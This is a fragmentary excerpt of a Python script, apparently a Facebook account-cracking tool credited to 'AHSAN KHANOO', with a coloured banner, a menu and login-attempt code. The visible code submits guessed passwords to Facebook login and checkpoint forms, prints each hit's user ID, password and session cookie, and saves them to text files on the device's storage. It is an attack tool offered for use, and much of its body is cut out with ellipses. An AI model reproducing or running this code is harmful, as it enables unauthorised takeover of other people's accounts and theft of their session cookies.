...
logo4 =f"""\x1b[1;91m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗ 
 ...
 ╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝
\x1b[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗ 
\x1b[1;91m[\\]\x1b[1;97m This Tools made by AHSAN KHANOO
\x1b[1;91m[\\] \x1b[1;97mUpdate by AHSAN KHANOO
\x1b[1;91m[\\] \x1b[1;97mBest Friends : Elyas Bacha & Itx Kandahari
...
def menu():
    ...
    if sel in['1', '01']:
        ...
        os.system('xdg-open https://www.facebook.com/KING.AHSAN.KHANOO')
    else:
                        ...
                        for x in BeautifulSoup(po.text, 'html.parser').find_all('form', {'method': 'post'}):
                            if 'confirmation_event_location=cliff' in str(x):
                                ...
                                if 'checkpoint' in rex.url:
                                    ...
                                    cok = self.ses.cookies.get_dict()
                                    print(f'\r\x1b[38;5;46m{A}[{G}AHSAN-OK💉{A}]{G} '+cok['c_user']+' | '+passw+'')
                                    print(f'\r{R}[{G}COOKIE{R}]{G}━{R}>{BU} '+coki)
                                    linex()
                                    open("/sdcard/AHSAN-AUTO-COOKIE.txt","a").write(cok['c_user']+"|"+passw+"|"+coki+"\n")
                                    open('/sdcard/AHSAN-AUTO-UID.txt','a').write(cok['c_user']+'|'+passw+'\n')
